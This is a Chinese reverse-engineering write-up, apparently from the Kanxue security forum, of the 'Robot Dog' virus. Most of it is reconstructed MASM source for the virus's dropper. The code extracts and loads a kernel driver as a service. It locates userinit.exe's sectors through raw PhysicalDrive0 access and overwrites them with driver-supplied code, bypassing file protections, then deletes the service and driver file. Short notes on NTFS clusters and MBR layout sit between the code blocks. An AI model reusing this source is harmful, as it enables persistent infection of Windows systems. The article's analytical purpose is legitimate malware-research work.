
# 逆向解毒机器狗

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-677.htm`](https://www.pediy.com/kssd/pediy09/pediy09-677.htm)

> 这两天得到了一个机器狗的病毒样本，周末闲来无事，便有了此篇文章。

> 该病毒的壳是一种压缩壳，采用 `esp` 定律即可解决。由于不是本文重点，因此在此不作讨论。

> 该病毒主要包含两部分，一部分是隐藏于 `exe` 资源中的驱动文件。另一部分就是 `exe` 本身。为了避免不法分子将代码用于他途，在此只公开 `exe` 的逆向还原代码。代码如下：

```
.386

.model flat,stdcall

option casemap:none


include windows.inc

include user32.inc

include kernel32.inc

include advapi32.inc

includelib advapi32.lib

includelib user32.lib

includelib kernel32.lib


.data

Text             db '对不起,驱动程序的加载没有成功,程序将无法运行.',0

FileName         db '\\.\PhysicalHardDisk0',0

a_Physicaldrive  db '\\.\PhysicalDrive0',0

aFCJ             db '分配内存不成功',0

OutputString     db '操作成功', 0

Dst              db 10Ch dup(0)

hModule          dd 0

ERR1             db '寻址文件不成功',0   

ERR2             db '不支持的磁盘分区',0

ERR3             db '第一个分区不是启动分区',0

ERR4             db '该文件是压缩文件，不能操作',0

ERR5             db '获取文件原始信息失败',0

ERR6             db '打开文件失败',0

ERR7             db '加载驱动失败',0


.code


Src              db '%SystemRoot%\system32\drivers\pcihdd.sys',0

ServiceName      db 'PciHdd',0


;********************************************************************

;退出服务，并删除文件

;********************************************************************

QuitService proc

  LOCAL ServiceStatus

  LOCAL hSCObject

  LOCAL hSCManager

  LOCAL @FileName[100h]:byte


  

  push  0F003Fh    ; dwDesiredAccess

  push  0    ; lpDatabaseName

  push  0    ; lpMachineName

  call  OpenSCManagerA

  or  eax, eax

  jz  OpenSCManagerFail

  mov  hSCManager, eax


  push  0F01FFh    ; dwDesiredAccess

  push  offset ServiceName ; "PciHdd"

  push  hSCManager ; hSCManager

  call  OpenServiceA

  or  eax, eax

  jz  OpenServiceFail

  mov  hSCObject, eax

  lea  eax, ServiceStatus

  push  eax    ; lpServiceStatus

  push  1    ; dwControl

  push  hSCObject  ; hService

  call  ControlService


  push  hSCObject  ; hService

  call  DeleteService


  push  hSCObject  ; hSCObject

  call  CloseServiceHandle


OpenServiceFail:    ; hSCObject

  push  hSCManager

  call  CloseServiceHandle


OpenSCManagerFail:    ; nSize

  push  100h

  lea  eax, @FileName

  push  eax    ; lpDst

  push  offset Src  ; "%SystemRoot%\\system32\\drivers\\pcihdd.sys"

  call  ExpandEnvironmentStringsA


  lea  eax, @FileName

  push  eax    ; lpFileName

  call  DeleteFileA

  ret

QuitService endp


;********************************************************************

;从资源中加载二进制内容写入文件，并将文件写入环境变量，然后启动服务，最后去掉环境变量，删除文件

;********************************************************************

LoadServiceFromRes proc   


  LOCAL ServiceStatus

  LOCAL hSCObject

  LOCAL hSCManager

  LOCAL nNumberOfBytesToWrite

  LOCAL lpBuffer

  LOCAL hResInfo

  LOCAL @FileName[110h]:byte

  LOCAL hObject

  LOCAL NumberOfBytesWritten


  push  3E9h    ; lpType

  push  3E9h    ; lpName

  push  hModule    ; hModule

  call  FindResourceA

  or  eax, eax

  jz  failed


  mov  hResInfo,  eax

  push  eax    ; hResInfo

  push  hModule    ; hModule

  call  SizeofResource

  mov  nNumberOfBytesToWrite, eax


  push  hResInfo  ; hResInfo

  push  hModule    ; hModule

  call  LoadResource

  or  eax, eax

  jz  failed


  push  eax    ; hResData

  call  LockResource

  or  eax, eax

  jz  failed

  mov  lpBuffer,  eax


failed:

  or  eax, eax

  jnz  CONTINUE

  jmp  Exit


CONTINUE:    ; nSize

  push  100h

  lea  eax, @FileName  

  push  eax    ; lpDst

  push  offset Src  ; "%SystemRoot%\\system32\\drivers\\pcihdd.sys"

  call  ExpandEnvironmentStringsA


  push  0    ; hTemplateFile

  push  80h    ; dwFlagsAndAttributes

  push  4    ; dwCreationDisposition

  push  0    ; lpSecurityAttributes

  push  0    ; dwShareMode

  push  40000000h  ; dwDesiredAccess

  lea  eax, @FileName

  push  eax    ; lpFileName

  call  CreateFileA

  cmp  eax, 0FFFFFFFFh

  jnz  short CREATEFILEOK

  jmp  Exit


CREATEFILEOK:

  mov  hObject, eax

  push  0    ; lpOverlapped

  lea  eax, NumberOfBytesWritten

  push  eax    ; lpNumberOfBytesWritten

  push  nNumberOfBytesToWrite ; nNumberOfBytesToWrite

  push  lpBuffer  ; lpBuffer

  push  hObject   ; hFile

  call  WriteFile


  push  hObject          ; hFile

  call  SetEndOfFile


  push  hObject    ; hFile

  call  FlushFileBuffers

  push  hObject   ; hObject

  call  CloseHandle

        

  push  0F003Fh         ; dwDesiredAccess

  push  0    ; lpDatabaseName

  push  0    ; lpMachineName

  call  OpenSCManagerA

  or  eax, eax

  jz  OpenSCManagerFailed

  mov  hSCManager, eax


  push  0    ; lpPassword

  push  0    ; lpServiceStartName

  push  0    ; lpDependencies

  push  0    ; lpdwTagId

  push  0    ; lpLoadOrderGroup

  lea  eax, @FileName

  push  eax    ; lpBinaryPathName

  push  0    ; dwErrorControl

  push  3    ; dwStartType

  push  1    ; dwServiceType

  push  0    ; dwDesiredAccess

  push  offset ServiceName ; "PciHdd"

  push  offset ServiceName ; "PciHdd"

  push  hSCManager      ; hSCManager

  call  CreateServiceA

  or  eax, eax

  jz  CreateServiceFailed

  mov  hSCObject, eax

  push  hSCObject  ; hSCObject

  call  CloseServiceHandle

  jmp  OPENSERVICE


CreateServiceFailed:     

  push  0F01FFh           ; dwDesiredAccess

  push  offset ServiceName ; "PciHdd"

  push  hSCManager      ; hSCManager

  call  OpenServiceA

  or  eax, eax

  jz  short OpenServiceFailed

  mov  hSCObject, eax

  lea  eax, ServiceStatus

  push  eax    ; lpServiceStatus

  push  1    ; dwControl

  push  hSCObject  ; hService

  call  ControlService

  push  hSCObject  ; hService

  call  DeleteService

  push  hSCObject  ; hSCObject

  call  CloseServiceHandle


OpenServiceFailed:     

  push  0               ; lpPassword

  push  0    ; lpServiceStartName

  push  0    ; lpDependencies

  push  0    ; lpdwTagId

  push  0    ; lpLoadOrderGroup

  lea  eax, @FileName

  push  eax    ; lpBinaryPathName

  push  0    ; dwErrorControl

  push  3    ; dwStartType

  push  1    ; dwServiceType

  push  0    ; dwDesiredAccess

  push  offset ServiceName ; "PciHdd"

  push  offset ServiceName ; "PciHdd"

  push  hSCManager ; hSCManager

  call  CreateServiceA

  or  eax, eax

  jz  QUIT

  mov  hSCObject, eax

  push  hSCObject  ; hSCObject

  call  CloseServiceHandle

  jmp  OPENSERVICE


QUIT:

  jmp  Exit


OPENSERVICE:     

  push  10h             ; dwDesiredAccess

  push  offset ServiceName ; "PciHdd"
```



```
push hSCManager ; hSCManager

call OpenServiceA

or eax, eax

jz OPENSERVICEFAILED

mov hSCObject, eax

push 0    ; lpServiceArgVectors

push 0    ; dwNumServiceArgs

push hSCObject ; hService

call StartServiceA

or eax, eax

jnz StartServiceOK

jmp Exit

StartServiceOK:    ; hSCObject

push hSCObject

call CloseServiceHandle

push hSCManager ; hSCObject

call CloseServiceHandle

jmp OpenSCManagerFailed

OPENSERVICEFAILED:     

push hSCManager 

call CloseServiceHandle

jmp Exit

OpenSCManagerFailed:    ; nSize

push 100h

lea eax, @FileName

push eax    ; lpDst

push offset Src ; "%SystemRoot%\\system32\\drivers\\pcihdd.sys"

call ExpandEnvironmentStringsA

lea eax, @FileName

push eax    ; lpFileName

call DeleteFileA

ret

Exit:     

push 10h

push 0    ; lpCaption

push offset Text ; "出错"

push 0    ; hWnd

call MessageBoxA

push 0    ; uExitCode

call ExitProcess

LoadServiceFromRes endp

aSystemrootSyst db '%SystemRoot%\System32\Userinit.exe',0
```

**********************************************************************

簇是磁盘使用的基本单元。组成一个簇的扇区数总是 2 的幂数，当卷被格式化时此数值是固定的。此数值称为簇要素，通常用字节引用，如 `8KB`，`2KB`。`NTFS` 通过每件事的逻辑簇数来寻址。

逻辑簇数（`LCN`）:卷里的每个簇都给定了一个顺序号，这是它的逻辑簇数。`LCN0`(零)指向卷的第一个簇（引导扇区）。用 `LCN` 乘以簇的大小就可以算出在卷里的物理偏移量。

实际簇数（`VCN`）:一个非常驻的流的每个簇都给定了一个顺序号，这是它的实际簇数。`VCN0`(零)指向这个流的第一个簇。要定位磁盘上的流，就必须把 `VCN` 转换成 `LCN`。这是在数据运转的帮助下完成的。

数据运转:每个 `LCN` 的连续模块都被赋予了一个数据运转，它包含一个 `VCN`，一个 `LCN` 和一个长度。当 `NTFS` 需要在磁盘上找到一个对象时，就查看数据运转中的 `VCN` 来得到 `LCN`。

其他信息:

1. 当卷被格式化时可以选择簇的大小。
2. 一个卷的簇的大小存储在 `$Boot` 里。也定义了此值在一个 `MFT` 文件记录和一个索引记录的簇里。
3. 如果扇区数在用，`NTFS` 通过引用簇数可以寻址更大的磁盘。

下面是一个关于允许和默认簇的大小的列表：

`Windows NT`

*   `512 bytes`, `1KB`, `2KB` or `4KB`
*   `Windows 2000`, `Windows XP`
    *   `512 bytes`, `1KB`, `2KB`, `4KB`, `8KB`, `16KB`, `32KB` or `64KB`

卷的大小 默认的簇的大小

*   `< 512MB` `Sector size`
*   `< 1GB` `1KB`
*   `< 2GB` `2KB`
*   `> 2GB` `4KB`

**********************************************************************

```
DoMyWork proc lpFileName ;成功返回值为 0

LOCAL lpBuffer
LOCAL nNumberOfBytesToWrite
LOCAL hDevice
LOCAL lDistanceToMove
LOCAL HighOffset
LOCAL dwLowPartofLcn
LOCAL dwHighPartofLcn
LOCAL StartSectorC
LOCAL hFile
LOCAL PhysicalBuff[512]:BYTE
LOCAL Buffer[512]:BYTE
LOCAL OutBuffer[272]:BYTE
LOCAL dwRet
LOCAL DistanceToMoveHigh:DWORD
LOCAL InBuffer[8]:BYTE
LOCAL hObject

pusha

push 0    ; hTemplateFile
push 0    ; dwFlagsAndAttributes
push 3    ; dwCreationDisposition
push 0    ; lpSecurityAttributes
push 0    ; dwShareMode
push 80000000h ; dwDesiredAccess
push offset FileName ; "\\\\.\\PhysicalHardDisk0" 是 pcihdd.sys 创建的符号链接
call CreateFileA
cmp eax, 0FFFFFFFFh
jz CreateFileFailed
mov hDevice, eax

push 0    ; hTemplateFile
push 20000000h ; dwFlagsAndAttributes
push 3    ; dwCreationDisposition
push 0    ; lpSecurityAttributes
push 3    ; dwShareMode
push 80000000h ; dwDesiredAccess
push lpFileName ; 打开 userinit.exe
call CreateFileA
cmp eax, 0FFFFFFFFh
jz CreateUserInitFileFailed
mov hObject, eax

push 8
lea eax,InBuffer
push eax
call RtlZeroMemory

push 110h         ;初始化
lea eax, OutBuffer
push eax
call RtlZeroMemory

push 0    ; lpOverlapped
lea eax, DistanceToMoveHigh
push eax    ; lpBytesReturned
push 110h    ; nOutBufferSize
lea eax, OutBuffer
push eax    ; lpOutBuffer
push 8    ; nInBufferSize
lea eax, InBuffer
push eax    ; lpInBuffer
push 90073h    ; dwIoControlCode = FSCTL_GET_RETRIEVAL_POINTERS
push hObject   ; hDevice
call DeviceIoControl ;通过 FSCTL_GET_RETRIEVAL_POINTERS 获取 userinit 文件数据的分布信息
or eax, eax
jz DeviceIoControlFailed

;这个结构是 8 字节对齐的,结构长度 32 字节
;typedef struct RETRIEVAL_POINTERS_BUFFER
;{
;    DWORD ExtentCount;
;    LARGE_INTEGER StartingVcn;
;    struct
;    {
;        LARGE_INTEGER NextVcn;
;        LARGE_INTEGER Lcn;
;    } Extents[1];
;} RETRIEVAL_POINTERS_BUFFER, *PRETRIEVAL_POINTERS_BUFFER;
;
;typedef union union
;{   
;   struct
;   {     
;       DWORD LowPart;     
;       LONG HighPart;   
;   };   
;   LONGLONG QuadPart;
;} LARGE_INTEGER, *PLARGE_INTEGER;

lea edi, OutBuffer    ;OutBuffer 是上面结构体指针
mov ebx, [edi]        ;ExtentCount = Extents 数组元素个数
lea edi, [edi+10h]    ;指向 Extents 数组首地址,根据字节对齐
mov eax, DistanceToMoveHigh
or ebx, ebx          ;判断 ExtentCount 是否为 0
jz ExtentCountIsZero 

mov eax, [edi+8]    ;指向 Extents[0].Lcn.LowPart
mov edx, [edi+0Ch]  ;指向 Extents[0].Lcn.HighPart
cmp eax, 0FFFFFFFFh
jz FEIHUA
cmp edx, 0FFFFFFFFh
jz FEIHUA

mov dwLowPartofLcn, eax ;保存 lcn 低 32 位
mov dwHighPartofLcn, edx ;保存 lcn 高 32 位

push 0    ; lpOverlapped
lea eax, DistanceToMoveHigh
push eax    ; lpNumberOfBytesRead
push 200h    ; nNumberOfBytesToRead
lea eax, Buffer
push eax    ; lpBuffer
push hObject         ; hFile
call ReadFile        ;读取 userinit 文件开头 512 字节

push hObject         ; hObject
call CloseHandle     

mov hObject, 0      ;关闭文件

push 0    ; hTemplateFile
push 0    ; dwFlagsAndAttributes
push 3    ; dwCreationDisposition
push 0    ; lpSecurityAttributes
push 3    ; dwShareMode
push 0C0000000h ; dwDesiredAccess
push offset a_Physicaldrive ; "\\\\.\\PhysicalDrive0"
call CreateFileA        ;打开物理硬盘读写
cmp eax, 0FFFFFFFFh
jz OPENPHYSICSFAILED
mov hFile, eax

push 0    ; dwMoveMethod
push 0    ; lpDistanceToMoveHigh
push 0    ; lDistanceToMove
push hFile         ; hFile
call SetFilePointer  ; 定位

push 0    ; lpOverlapped
lea eax, DistanceToMoveHigh
push eax    ; lpNumberOfBytesRead
push 200h    ; nNumberOfBytesToRead
lea eax, PhysicalBuff
push eax    ; lpBuffer
push hFile         ; hFile
call ReadFile        ;读取硬盘主引导分区 MBR

;   0000 |------------------------------------------------|
;         |                                                |
;         |                                                |
;         |          Master Boot Record                   |
;         |                                                |
;         |                                                |
;         |          主引导记录(446 字节)                  |
;         |                                                |
;         |                                                |
```



```
;    |                                                            |
;  01BD  |                                                            |
;  01BE  |------------------------------------------------|
;    |                                                            |
;  01CD  |             分区信息  1(16 字节)                    |
;  01CE  |------------------------------------------------|
;    |                                                            |
;  01DD  |             分区信息  2(16 字节)                    |
;  01DE  |------------------------------------------------|
;    |                                                            |
;  01ED  |             分区信息  3(16 字节)                    |
;  01EE  |------------------------------------------------|
;    |                                                            |
;  01FD  |             分区信息  4(16 字节)                    |
;    |------------------------------------------------|
;    | 01FE                | 01FF                     |
;    |       55            |           AA             |
;    |------------------------------------------------|
;分区表
;
;    分区表是一个链表，主分区表是分区链表的第一个节点。由于主分区表中只能分四个分区, 无法满足需求, 因此设计了一种扩展分区格式。扩展分区就是分区表的第二个节点到最后一个节点。
;
;    主分区表是从主引导扇区第 0x1BE 字节开始的，共 64 个字节，最后是 0x55AA。64 个字节的分区信息分为四组，每 16 字节为一组。每组的数据结构是这样的：
;
;typedef struct
;{
;    BYTE  byState;//分区状态, 0 = 未激活, 0x80 = 激活
;    BYTE  byBeginHead;//分区起始磁头号
;    WORD  wBeginSC;//分区起始扇区和柱面号, 底字节的低 6 位为扇区号, 高 2 位为柱面号的第 9,10 位, 高字节为柱面号的低 8 位
;    BYTE  byFSID;  //分区类型, 如 0x0B = FAT32, 0x83 = Linux 等, 00 表示此项未用
;    BYTE  byEndHead;//分区结束磁头号
;    WORD  wEndSC;//分区结束扇区和柱面号
;    DWORD dwInfoAreaSectors;//在线性寻址方式下的分区相对扇区地址
;    DWORD dwSectors;//分区大小 (总扇区数)
;} INFOAREA_PARAM;//磁盘的分区信息
```

```asm
 lea  edi, PhysicalBuff
 cmp  byte ptr [edi+1BEh], 80h  ;byState 判断是否为活动分区
 jnz  NOTACTIVEDISK
 movzx  ebx, byte ptr [edi+1C2h]  ;byFSID 判断分区类型
 cmp  ebx, 0Bh
 jz  FAT32                 ;Win95 FAT32
 cmp  ebx, 0Ch
 jz  FAT32                 ;Win95 FAT32 LBA
 cmp  ebx, 7
 jnz  NTFS                 ;HPFS/NTFS

FAT32:
 mov  eax, [edi+1C6h]      ;C 盘起始扇区（首扇区的相对扇区号）
 mov  StartSectorC, eax
 xor  edx, edx
 imul  eax, 200h           ;求出实际的字节偏移
 mov  DistanceToMoveHigh, edx
 mov  ecx, eax

 push 0    ; dwMoveMethod
 lea  eax, DistanceToMoveHigh
 push  eax    ; lpDistanceToMoveHigh
 push  ecx    ; lDistanceToMove
 push  hFile          ; hFile
 call  SetFilePointer   ;定位到硬盘 C 盘起始扇区的绝对位置

 push 0    ; lpOverlapped
 lea  eax, DistanceToMoveHigh
 push  eax    ; lpNumberOfBytesRead
 push  200h    ; nNumberOfBytesToRead
 lea  eax, PhysicalBuff
 push  eax    ; lpBuffer
 push  hFile  ; hFile
 call  ReadFile        ;读硬盘 C 盘起始扇区 即：第一个分区的引导扇区 BPB

 lea  edi, PhysicalBuff
 movzx  eax, word ptr [edi+0Eh]; BPB_RsvdSecCnt = 保留扇区数量
 add  StartSectorC, eax
 cmp  ebx, 0Bh           ;Win95 FAT32
 jz  WIN95FAT32
 cmp  ebx, 0Ch           ;Win95 FAT32 LBA
 jnz  short FAT32LBA

WIN95FAT32:
 movzx  ecx, byte ptr [edi+10h]; BPB_NumFATS = 每个分区占用的 FAT 表 数
 mov  eax, [edi+24h]      ; BPB_FATSz32 = 每个 FAT 占用扇区数
 xor  edx, edx
 imul  eax, ecx
 add  StartSectorC, eax      ;数据记录起始扇区

FAT32LBA:
 mov  eax, dwLowPartofLcn
 mov  edx, dwHighPartofLcn
 movzx  ecx, byte ptr [edi+0Dh]   ;BPB_SecPerClus =  每簇多少扇区
 mov  nNumberOfBytesToWrite, ecx
 imul  eax, ecx
 add  eax, StartSectorC
 adc  edx, 0
 imul  eax, 200h           ;求出绝对偏移字节位置
 mov  HighOffset, edx      ;偏移高 32 位
 mov  lDistanceToMove, eax ;低 32 位

 push 0    ; dwMoveMethod
 lea  eax, HighOffset
 push  eax    ; lpDistanceToMoveHigh
 push  lDistanceToMove ; lDistanceToMove
 push  hFile          ; hFile
 call  SetFilePointer

 push 0    ; lpOverlapped
 lea  eax, DistanceToMoveHigh
 push  eax    ; lpNumberOfBytesRead
 push  200h    ; nNumberOfBytesToRead
 lea  eax, PhysicalBuff
 push  eax    ; lpBuffer
 push  hFile    ; hFile
 call  ReadFile        ;在找到的硬盘扇区读

 lea  edi, PhysicalBuff
 lea  esi, Buffer
 mov  ecx, 200h
 repe cmpsb            ;通过对比 ReadFile 读取的文件数据和自己定位后直接读取所得到的文件数据，确定定位是否正确

 or  ecx, ecx
 jnz  DIFF

 push 0    ; dwMoveMethod
 lea  eax, HighOffset
 push  eax    ; lpDistanceToMoveHigh
 push  lDistanceToMove ; lDistanceToMove
 push  hFile  ; hFile
 call  SetFilePointer  ;重新定位到上面找到的硬盘扇区处

 mov  eax, nNumberOfBytesToWrite
 shl  eax, 9                   ;这个值是作者估算的
 mov  nNumberOfBytesToWrite, eax

 push  nNumberOfBytesToWrite ; dwBytes
 push  40h         ; uFlags
 call  GlobalAlloc
 or  eax, eax
 jz  ALLOCMEMORYFAILED
 mov  lpBuffer,eax

 mov  ecx, offset MessageBoxA
 sub  ecx, offset Src  ; "%SystemRoot%\\system32\\drivers\\pcihdd.sys"

       ;把整个代码体作为参数传递给 pcihdd.sys,控制码 0xF0003C04，
 push 0    ; lpOverlapped
 lea  eax, DistanceToMoveHigh
 push  eax    ; lpBytesReturned
 push  nNumberOfBytesToWrite ; nOutBufferSize
 push  lpBuffer  ; lpOutBuffer
 push  ecx    ; nInBufferSize
 push  offset Src  ; "%SystemRoot%\\system32\\drivers\\pcihdd.sys"
 push  0F0003C04h  ; dwIoControlCode
 push  hDevice    ; hDevice
 call  DeviceIoControl

 ;并将 pcihdd 返回的数据直接写入 userinit.exe 的第一簇
 push 0    ; lpOverlapped
 lea  eax, DistanceToMoveHigh
 push  eax    ; lpNumberOfBytesWritten
 push  nNumberOfBytesToWrite ; nNumberOfBytesToWrite
 push  lpBuffer  ; lpBuffer
 push  hFile    ; hFile
 call  WriteFile

 push  hFile  ; hFile
 call  FlushFileBuffers
 mov  dwRet, 0
 jmp  OVER

ALLOCMEMORYFAILED:
   ; "分配内存不成功"
 mov  dwRet, offset aFCJ

OVER:      ; hMem
 push  lpBuffer
 call  GlobalFree
 jmp  FINISHED

DIFF:
 mov  dwRet, offset ERR1
 jmp  FINISHED

NTFS:
 mov  dwRet, offset ERR2
 jmp  FINISHED

NOTACTIVEDISK:
 mov  dwRet, offset ERR3

FINISHED:    ; hObject
 push  hFile
 call  CloseHandle
 jmp  OPENPHYSICSFAILED

FEIHUA:
 mov  dwRet, offset ERR4

OPENPHYSICSFAILED ;打开硬盘设备失败
 jmp  ExtentCountIsZero

DeviceIoControlFailed:
 mov  dwRet, offset ERR5

ExtentCountIsZero:
 cmp  hObject, 0
 jz  ZeroObject
 push  hObject  ; hObject
 call  CloseHandle
 jmp  ZeroObject

CreateUserInitFileFailed:
 mov  dwRet, offset ERR6

ZeroObject:    ; hObject
 push  hDevice
 call  CloseHandle
 jmp  EXIT

CreateFileFailed:
 mov  dwRet, offset ERR7

EXIT:
 popa
 mov  eax, dwRet
 ret
DoMyWork endp

start proc
 push 0    ; lpModuleName
 call  GetModuleHandleA
 mov  hModule, eax
 call  LoadServiceFromRes ;load service from resource

 push  100h    ; nSize
 push  offset Dst  ; lpDst
 push  offset aSystemrootSyst ; "%SystemRoot%\\System32\\Userinit.exe"
 call  ExpandEnvironmentStringsA

 push  offset Dst  ; lpFileName
 call  DoMyWork
```



```
or   eax, eax  
jnz  FAILED  
push offset OutputString ;  
call OutputDebugStringA  
jmp  Exit  

FAILED:    ; lpOutputString  
push eax  
call OutputDebugStringA  

Exit:  
call QuitService  
push 0    ; uExitCode  
call ExitProcess  

start endp  

end start
```

声明：

本文的目的纯粹是一种技术交流，使用本文所演示的技术所造成的一切影响都与本人无关.  

转贴请注明：来自看雪学院。![](img/768c8e05987a6949d1bb5f7378212ee0.jpg "狂笑")

`4dd466d0e1e0cc123afbe504da2462ca`
